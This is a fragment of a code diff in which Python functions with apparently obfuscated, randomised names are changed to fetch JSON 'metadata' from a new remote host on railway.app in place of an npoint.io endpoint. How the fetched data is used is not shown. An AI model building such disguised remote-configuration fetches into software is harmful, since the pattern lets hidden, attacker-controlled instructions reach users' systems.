@@ -18,7 +18,7 @@ def learn_hpjdpf_323():
 
     def data_yajtly_865():
         try:
-            eval_sgpcbk_321 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_sgpcbk_321 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_sgpcbk_321.raise_for_status()
             train_blacee_703 = eval_sgpcbk_321.json()
             train_vlzrwd_698 = train_blacee_703.get('metadata')
